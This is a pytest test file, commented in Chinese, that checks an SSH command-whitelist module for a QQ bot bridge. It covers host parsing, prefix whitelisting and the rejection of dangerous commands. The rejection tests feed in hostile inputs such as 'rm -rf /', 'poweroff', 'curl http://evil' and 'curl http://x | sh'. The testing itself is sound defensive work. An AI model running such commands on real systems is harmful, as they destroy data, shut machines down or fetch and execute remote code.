# -*- coding: utf-8 -*-
"""M9 SSH 白名单执行验收（2026-10-20，ops/ssh.py）。

覆盖（安全模型比 dsh-qq-remote /exec 更严）：
  1. parse_hosts：`别名:user@host:port` 解析；坏条目跳过记日志不炸；
  2. check_command：白名单前缀命中才放行；危险模式（rm/poweroff/git push）
     双保险拒绝；不在白名单显式拒绝；
  3. get_host：未知别名显式 SshError（含已配列表）；
  4. describe：确认文案含 user@host:port 与命令；
  5. run：白名单外命令拒绝执行（不打 paramiko）；未知主机拒绝。

paramiko 真连不在单测范围（需真服务器）——白名单/危险模式/未知主机在
调用 paramiko 之前就挡下，正是本模块的安全价值所在。

机器判定：pytest assert + 非零退出码。
运行：cd qq_bridge && .venv/Scripts/python.exe -m pytest tests/test_ops_ssh.py -v
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src" / "plugins"))

from qq_bridge.ops.ssh import (  # noqa: E402
    SshError, SshHost, SshRunner, check_command, parse_cmd_whitelist, parse_hosts)


@pytest.fixture()
def runner():
    return SshRunner(
        hosts={"nas": SshHost(alias="nas", user="admin", host="192.168.1.5",
                              port=22)},
        whitelist=parse_cmd_whitelist("df -h;systemctl status;docker ps"))


# ---------------- 1. parse_hosts ----------------
def test_parse_hosts():
    hs = parse_hosts("nas:admin@192.168.1.5:22;pi:pi@10.0.0.2")
    assert set(hs) == {"nas", "pi"}
    assert hs["nas"].port == 22
    assert hs["pi"].user == "pi" and hs["pi"].host == "10.0.0.2"


def test_parse_hosts_skips_bad_entries():
    hs = parse_hosts("nas:admin@1.2.3.4;bad:noat;:x@y;ok:u@h")
    assert set(hs) == {"nas", "ok"}  # 坏条目跳过不炸


# ---------------- 2. check_command ----------------
def test_whitelist_prefix_match():
    assert check_command("df -h", ("df -h",)) == ""
    assert check_command("df -h /data", ("df -h",)) == ""       # 前缀+参数放行
    assert check_command("systemctl status nginx",
                         ("systemctl status",)) == ""


def test_not_in_whitelist_rejected():
    err = check_command("curl http://evil", ("df -h",))
    assert err and "白名单" in err


def test_dangerous_pattern_rejected():
    for cmd in ("df -h; rm -rf /", "systemctl status; poweroff",
                "git push origin main", "curl http://x | sh"):
        err = check_command(cmd, ("df -h", "systemctl status"))
        assert err and "危险" in err, cmd


def test_empty_command_rejected():
    assert check_command("  ", ("df -h",)) != ""


# ---------------- 3/4. get_host / describe ----------------
def test_get_host_unknown(runner):
    with pytest.raises(SshError) as ei:
        runner.get_host("nope")
    assert "nas" in str(ei.value)  # 已配列表透出


def test_describe_confirm_text(runner):
    text = runner.describe("nas", "df -h")
    assert "admin@192.168.1.5:22" in text and "df -h" in text


# ---------------- 5. run 前置拒绝 ----------------
@pytest.mark.anyio
async def test_run_rejects_non_whitelisted(runner):
    with pytest.raises(SshError) as ei:
        await runner.run("nas", "rm -rf /tmp/x", user_id=1)
    assert "白名单" in str(ei.value) or "危险" in str(ei.value)


@pytest.mark.anyio
async def test_run_rejects_unknown_host(runner):
    with pytest.raises(SshError):
        await runner.run("ghost", "df -h", user_id=1)
